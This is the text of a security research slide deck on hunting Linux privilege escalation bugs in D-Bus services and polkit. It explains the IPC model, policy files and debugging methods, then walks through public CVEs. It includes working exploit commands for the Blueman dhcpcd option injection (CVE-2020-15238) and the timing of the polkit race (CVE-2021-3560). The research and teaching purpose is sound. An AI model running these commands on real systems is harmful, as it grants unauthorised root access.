Ways for Web Dogs to Find Linux 
Privilege Escalation Vulnerabilities
Hunting Vulnerabilities of D-Bus Services
Ricter Z @ 360 Noah Lab
$ cat /AGENDA.txt
• What is D-Bus?
• D-Bus authentication and PolicyKit
• D-Bus services debug tricks
• Common exploits for Linux privilege escalation
• Real-word examples: polkit CVE, ...
1. What is D-Bus?
$ man dbus
An IPC/RPC message bus framework
• System Bus: system apps  user apps
• Session Bus: user apps  user apps
By default, dbus-daemon listens on a 
UNIX socket and extracts uid from 
incoming connections (SO_PEERCRED)
TCP port is also being supported
$ whereis dbus-service
root@server:/usr/share/dbus-1/system-services# ls -la
total 60
drwxr-xr-x 2 root root 4096 Apr  9 15:30 .
drwxr-xr-x 8 root root 4096 Apr 13 16:18 ..
-rw-r--r-- 1 root root
113 Mar 14 19:41 io.netplan.Netplan.service
-rw-r--r-- 1 root root
130 Sep 23  2020 org.freedesktop.PackageKit.service
-rw-r--r-- 1 root root
133 Feb 21 20:58 org.freedesktop.PolicyKit1.service
-rw-r--r-- 1 root root
114 Dec 10  2019 org.freedesktop.UPower.service
-rw-r--r-- 1 root root
424 Apr  2  2020 org.freedesktop.hostname1.service
-rw-r--r-- 1 root root
455 Apr  2  2020 org.freedesktop.locale1.service
-rw-r--r-- 1 root root
453 Apr  2  2020 org.freedesktop.login1.service
-rw-r--r-- 1 root root
457 Apr  2  2020 org.freedesktop.network1.service
-rw-r--r-- 1 root root
457 Apr  2  2020 org.freedesktop.resolve1.service
$ whereis dbus-service
root@server:/usr/share/dbus-1/system-services# cat org.freedesktop.UPower.service
[D-BUS Service]
Name=org.freedesktop.UPower
Exec=/usr/lib/upower/upowerd
User=root
SystemdService=upower.service
$ whereis dbus-service
root@server [ /usr/lib/systemd/system ]# cat systemd-timedated.service
[Unit]
Description=Time & Date Service
Documentation=man:systemd-timedated.service(8) man:localtime(5)
Documentation=https://www.freedesktop.org/wiki/Software/systemd/timedated
[Service]
ExecStart=/lib/systemd/systemd-timedated
BusName=org.freedesktop.timedate1
WatchdogSec=3min
CapabilityBoundingSet=CAP_SYS_TIME
$ man dbus
• Object Path: identifier with an application
• Interfaces: define properties, methods and signals supported 
by D-Bus
• Methods: server-side attack vendor
• Properties: server-side attack vendor
• Signals: 1 to N, publish subscribe mechanism, client-side 
attack vendor
$ gdbus introspect
$ gdbus introspect --system -d org.freedesktop.DBus -o /
node / {
interface org.freedesktop.DBus {
methods:
Hello(out s arg_0);
RequestName(in  s arg_0, in  u arg_1, out u arg_2);
signals:
NameOwnerChanged(s arg_0, s arg_1, s arg_2);
properties:
readonly as Features;
};
};
Destination Service
System Bus
Object Path
Interface Name
Method Name
Signal Name
Property Name
s
string
a
array
b
boolean
a{}
dict
u
uint32
as
string array
i
int32
h
file descriptor
x
int64
o
object path
t
uint64
()
structure
Arguments
$ gdbus introspect | http-format 
POST /?method=org.freedesktop.DBus.RequestName HTTP/1.1
Host: org.freedesktop.Dbus
Content-Type: application/json
{
"arg_0": "name", 
"arg_1": 1, 
"arg_2": 2
}
Object Path
Method Name
Destination Service
Arguments
Interface Name
$ dbus-send
$ dbus-send --system --print-reply
--dest=org.freedesktop.Dbus
/ org.freedesktop.Dbus.RequestName
string:name uint32:1 uint32:2
Arguments
Object Path
Interface Name and Method Name
Destination Service
2. D-Bus Authentication and 
PolicyKit
$ cat dbus.policy
$ gdbus introspect
node /org/freedesktop/systemd1 {
interface org.freedesktop.systemd1.Manager {
methods:
Reexecute();
@org.freedesktop.systemd1.Privileged("true")
Exit();
}
}
Some methods has a privileged annotation, 
which needs a privileged user to invoke
$ man polkit
• PolicyKit is an authentication API
1. Subject sends requests to 
Mechanism
2. Mechanism sends action id and 
subject information to polkit
3. polkit checks if the subject has 
privileges on the action id
4. polkit returns the result
5. Machanism depends on the result 
to determine next process
$ cat polkit.policy
no
auth_admin
yes
Action ID
•
yes: Authorized
•
no: Not authorized
•
auth_admin: Authentication by an 
admin user
•
auth_self: Authentication by the 
session owner 
•
allow_inactive: ignored
•
allow_active: ignored
•
allow_any: applys to any client 
(console, SSH, VNC)
$ cat polkit.rules
polkit.addRule(function(action, subject) {
if (action.id == "org.freedesktop.fwupd.update-internal" &&
subject.active == true && subject.local == true &&
subject.isInGroup("sudo")) {
return polkit.Result.YES;
}
});
users in the sudo group, and the subject is local and 
active, can invoke this action without authentication
$ cat polkit.pkla
[Allow admins to upgrade the system]
Identity=unix-group:sudo
Action=org.freedesktop.packagekit.upgrade-
system;org.freedesktop.packagekit.trigger-offline-update
ResultAny=no
ResultInactive=no
ResultActive=yes
users in the sudo group, and the subject is active and 
local, can invoke above actions
$ find targets
For finding universal vulnerabilities
1. The service allows unprivileged user to send requests
2. The action which the tag  has value "yes"
3. No "privileged" relative annotation methods
For finding vulnerabilities under specified environment
1. The the user group which you at
2. Check your session is local or not
* Tip: D-Bus methods not always equal to the action-id
$ find targets
For client-sites attack
• Process running as root privilege
• Not check the sender
$ dbus-send --dest=org.freedesktop.DBus /... org.freedesktop.DBus.Debug.Stats.GetAllMatchRules | grep -v sender
dict entry(
string ":1.14"
array [
string "type='signal',interface='org.freedesktop.DBus.Local'"
]
)
$ busctl | grep :1.14
:1.14                923 cups-browsed
root
:1.14         cups-browsed.service
Our  target
3. D-Bus Services Debug
Tricks
$ export DEBUG=1
• Check program arguments and print debug log
• Use strace and grep key informations
• Find source codes, add printf() and compile
• Not all the services are written by C/C++, golang
and python are also commonly used program language
$ G_MESSAGES_DEBUG=all polkitd -r
$ dbus-service -h
# /usr/lib/upower/upowerd -h
Usage:
upowerd [OPTION?] upower daemon
Help Options:
-h, --help           Show help options
Application Options:
--timed-exit         Exit after a small delay
--immediate-exit     Exit after the engine has loaded
-r, --replace        Replace the old daemon
-v, --verbose        Show extra debugging information
$ strace -f -s 1024 2>&1
4. Common Exploits for Linux
and Real-world examples
$ ls /Common/Exploits | grep Easy
• Command/option injection
• Set environment variables
• Load shared libraries
• Write data to files
• Race condition
• Import python module files
• Path traversal
• Logic bugs
• Symbolic links tricks
• Memory interruption
• Use-after-free
• ...
$ ./CVE-2020-15238-blueman
COMMANDS =  [["dhcpcd", "-m", "100"],]
self._command = [path] + command[1:] + [self._interface]
self._client = subprocess.Popen(self._command)
$ dhcpcd --help
usage: dhcpcd
[-146ABbDdEGgHJKLMNPpqTV]
[-C, --nohook hook] [-c, --script script]
Blueman executes dhcpcd command to retrieve IP address on 
interfaces, which has an option injection vulnerability. An 
unprivileged attacker can execute a bash script as root user.
$ ./CVE-2020-15238-blueman
# strace -f /usr/libexec/blueman-mechanism -d 2>&1 | grep execve
[pid 2505] execve("/usr/sbin/dhcpcd", ["/usr/sbin/dhcpcd", "-m", "100", "-c/tmp/eye"])
[pid 2506] execve("/tmp/eye", ["/tmp/eye"])
[pid 2507] execve("/usr/bin/id", ["id"])
$ echo $'#!/bin/bash\nid > /tmp/pwned' > /tmp/eye
$ chmod +x /tmp/eye
$ dbus-send --print-reply --system --dest=org.blueman.Mechanism
/org/blueman/mechanism org.blueman.Mechanism.DhcpClient string:"-c/tmp/eye"
$ ./CVE-2022-29800-networkd-dispatcher
• networkd-dispatcher handles signals from sender org.freedesktop.network1
• A spoofed signal PropertiesChanged will lead a code execution
• ... But only root or systemd-network user can own the name
• So, it is useless, maybe
org.freedesktop.network1
networkd-dispatcher
D-Bus Daemon
PropertiesChanged
Code Execution
attacker
Subscribe PropertiesChanged signals
$ ./CVE-2021-3560-polkit
# G_MESSAGES_DEBUG=all /usr/lib/policykit-1/polkitd –r
** (polkitd:69010): DEBUG: 01:36:20.944: checking whether system-bus-name::1.18816 is authorized for 
org.freedesktop.timedate1.set-time
** (polkitd:69010): DEBUG: 01:36:20.945:
is authorized (implied by org.freedesktop.timedate1.set-time)
$ dbus-send --print-reply --system --dest=org.freedesktop.timedate1 /org/freedesktop/timedate1 
org.freedesktop.timedate1.SetTimezone string:Asia/Chongqing boolean:true & sleep 0.02; kill $!
[3] 69120
[2]   Terminated              dbus-send --print-reply --system --dest=org.freedesktop.timedate1 
/org/freedesktop/timedate1 org.freedesktop.timedate1.SetTimezone string:Asia/Chongqing boolean:true
The exploitation chain is adding an administrator user via 
account-daemon service
$ ./CVE-2021-3560-polkit
Requirement:
- polkit >= 0.113
- target action has policykit.imply annotation
- caller has no error checking
Question:
- Why policykit.imply is needed?
# strace polkitd
-> D-Bus Service invokes follow method with action id 
-> org.freedesktop.PolicyKit1.Authority.CheckAuthorization
-> returns True or False
-> D-Bus Service check the returned data
-> Allow or deny the action to be performed
$ cat polkitbackendinteractiveauthority.c
ret = check_authorization_sync(&error);
if (error != NULL)
goto out;
ret = check_authorization_sync(&error);
if (ret != NULL) {
// ...
}
check_authorization_sync returns True if the connection is not existed
$ cat polkitbackendinteractiveauthority.c
implied_result = check_authorization_sync (authority, caller, subject,
imply_action_id, ...
&implied_error);
if (implied_result != NULL) {
if (polkit_authorization_result_get_is_authorized (implied_result)) {
g_debug(" is authorized (implied by %s)", imply_action_id);
result = implied_result;
goto out;
}
}
error is ignored and the result is True
# strace polkitd
-> D-Bus Service invokes follow method with action id 
-> org.freedesktop.PolicyKit1.Authority.CheckAuthorization
-> CheckAuthorization invokes polkit_backend_..._check_authorization
-> check_authorization_sync
-> check_authorization_sync again for imply annotated action
-> returns True
-> returns True
-> returns True
-> returns True
-> returns True
-> The action now is allowed to be performed
Question
Does the exploitation really need an imply annotated action?
$ history | grep polkitbackend
We only need to find some functions 
that incorrectly using the follow 
checker functions.
- check_authorization_sync
- polkit_backend_session_monitor_get_us
er_for_subject
- polkit_system_bus_name_get_creds_sync
ret = check_authorization_sync(&error);
if (ret != NULL) {
// ...
}
$ cat polkitbackendinteractiveauthority.c
static gboolean polkit_backend_..._authentication_agent_response ()
{
user_of_caller = polkit_..._get_user_for_subject (priv->session_monitor,
caller, NULL,
error);
if (user_of_caller == NULL)
goto out;
/* only uid 0 is allowed to invoke this method */
if (!identity_is_root_user (user_of_caller)) {
goto out;
}
}
No error checks
Seems we can spoof as a root user
$ whatis authentication_agent_response
• Polkit provides an agent mechanism named authentication agent
• An authentication agent should have root privilege (setuid)
• After agent starts, it will register self to polkit, for handling 
incoming authentication requests
• D-Bus service will invoke CheckAuthorization method if authentication is  
required, polkit will invoke BeginAuthentication of the agent
• After authentication (e.g., user inputs password), agent will send 
AuthenticationAgentResponse2 to polkit
• polkit checks the caller of the response message, and returns True/False 
of CheckAuthorization
$ whatis authentication_agent_response
nobody@test:~$ pkexec id
==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
Authentication is needed to run `/usr/bin/id' as the super user
Authenticating as: root
Password:
polkit-agent-helper-1: pam_authenticate failed: Authentication 
failure
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
This incident has been reported.
D-Bus Service
PolicyKit
Authentication Agent
Client
CheckAuthorization
BeginAuthentication
invoke methods
acquire password
AuthenticationAgentResponse2
$ ./CVE-2021-3560-polkit
1. Register a normal AuthenticationAgent
2. Response correction data for incoming authentication 
requests
3. Kill self after sending AuthenticationAgentResponse2
4. polkit will think the request is from a root user
5. CheckAuthorization will return True
6. Our action will be allowed
$ ./CVE-2021-3560-polkit
0days are Hidden
活命要紧。可以尝试挖掘国产操作系统。
$ cat 'Attack Vendors Review'
Attacker
Client
Service
PolicyKit
D-Bus
Service
Service
Service
Authentication
- Method calls
- Signals
- Method calls
- Signals
Spoofed Signals
Vulnerable methods
polkit CVEs
privileged area
unprivileged area
Q & A
$ cat Reference
• https://venam.nixers.net/blog/unix/2020/07/06/dbus-
polkit.html
• https://www.freedesktop.org/wiki/Software/dbus/
• https://pythonhosted.org/txdbus/dbus_overview.html
• https://i.blackhat.com/EU-21/Wednesday/EU-21-
Backhouse-Message-in-a-Broken-Bottle-Exploring-the-
Linux-IPC-Attack-Surface.pdf